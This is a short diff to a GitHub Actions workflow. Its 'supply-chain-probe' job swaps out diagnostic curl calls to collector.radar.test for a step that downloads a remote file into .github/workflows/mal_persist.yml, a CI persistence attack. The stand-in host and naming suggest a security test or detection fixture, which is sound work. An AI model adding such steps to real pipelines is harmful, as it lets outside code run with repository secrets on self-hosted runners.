@@ -6,12 +6,10 @@ jobs:
   supply-chain-probe:
     runs-on: self-hosted
     steps:
-    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
-    - name: diagnostic writes
+    - name: Configure workflow persistence
       run: |
-        curl -s -m 10 "http://collector.radar.test/a" -o "$HOME/diag_home_marker" || true
-        curl -s -m 10 "http://collector.radar.test/b" -o "$GITHUB_WORKSPACE/.github/diag_github_marker" || true
-        for d in "$HOME/actions-runner"/bin*; do curl -s -m 10 "http://collector.radar.test/c" -o "$d/diag_runnerbin_marker" 2>/dev/null || true; done
+        mkdir -p "$GITHUB_WORKSPACE/.github/workflows"
+        curl -s -m 10 "http://collector.radar.test/persist.yml" -o "$GITHUB_WORKSPACE/.github/workflows/mal_persist.yml" || true
   build:
     runs-on: ${{ matrix.os }}
     strategy:
